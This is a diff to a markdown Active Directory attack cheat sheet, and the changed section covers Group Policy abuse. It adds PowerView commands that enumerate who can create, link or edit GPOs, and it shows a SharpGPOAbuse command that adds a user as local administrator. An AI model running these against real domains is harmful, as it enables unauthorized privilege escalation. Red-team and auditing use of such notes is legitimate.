@@ -392,9 +392,25 @@ python3 aclpwn.py --restore aclpwn.restore
 
 ### GPO Abuse
 - Members of ```Group Policy Creator Owners``` can create new GPO's. But they cant link it to anything or modify existing GPO’s. The creator will have to modify rights over created GPO.
-- https://github.com/FSecureLABS/SharpGPOAbuse
 
-#### Add local admin
+#### Show who can create new GPO's
+```
+Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=<DOMAIN>,DC=<DOMAIN>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+```
+
+#### Show who can write to GP-link attribute on OUs
+```
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+```
+
+#### Show who can edit GPO's with 4 digit RID
+- Has WriteProperty, WriteDACL or WriteOwner
+```
+Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "<DOMAIN SID>-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+```
+
+#### Add local admin abuse
+- https://github.com/FSecureLABS/SharpGPOAbuse
 ```
 ./ShapGPOAbuse.exe --AddLocalAdmin --GPOName <GPONAME> --UserAccount <USERNAME>
 gpupdate /force #On the target machine if you got normal access already
